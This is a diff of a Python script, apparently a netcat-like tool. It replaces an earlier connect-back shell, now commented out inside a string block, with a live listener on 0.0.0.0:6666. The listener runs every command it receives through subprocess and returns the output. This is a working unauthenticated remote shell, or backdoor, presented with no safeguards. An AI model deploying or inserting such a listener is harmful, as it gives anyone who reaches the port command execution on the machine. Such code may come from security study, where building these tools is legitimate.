@@ -73,10 +73,10 @@ def server_execute(cmd):
     cmd = cmd.strip()
     if not cmd:
         return
-    result= subprocess.check_output(cmd)
-    result=(result.decode())
+    result = subprocess.check_output(cmd)
+    result = (result.decode())
     return result
-
+'''
 
 def server_shell():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -86,11 +86,75 @@ def server_shell():
        cmd = client.recv(1024).decode()
        result = server_execute(cmd)
        client.send(result.encode())
-
-
-
-
 server_shell()
+
+'''
+
+
+
+
+# Server Mode -l
+
+
+
+'''
+def server_listen(ip,port):
+   server = socket.socket()
+   server.bind((ip,port))
+   server.listen()
+   print(f'[*] Listening on {(ip,port)}')
+   s,r_ip_port = server.accept()
+   return(s,r_ip_port)
+   #data = s.recv(1024)
+   #print(data.decode())
+   
+
+def server_shell(raddr):
+   client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   client.connect(raddr)
+   while True:
+      client.send(b"#> ")
+      cmd = client.recv(1024).decode()
+      result = server_execute(cmd)
+      client.send(result.encode())
+
+socket_raddr = server_listen(ip,port)
+
+socket_raddr = list(socket_raddr)
+raddr=(socket_raddr[1])
+
+server_shell(raddr)
+'''
+
+# Listening socket
+l_ip_port = ('0.0.0.0', 6666)
+
+# Create a server and start listening
+server = socket.socket()
+server.bind(l_ip_port)
+server.listen()
+s, remote = server.accept()
+print(f'[*] Connecting with {remote}')
+
+# Method receiving and sending data
+def com():
+    while True:
+      s.send(b"#> ")
+      cmd = s.recv(1024).decode()
+      result = server_execute(cmd)
+      s.send(result.encode())
+
+# Start receiving and sending data
+com_thread = threading.Thread(target = com)
+com_thread.start()
+
+
+
+
+
+
+
+
 
 
 
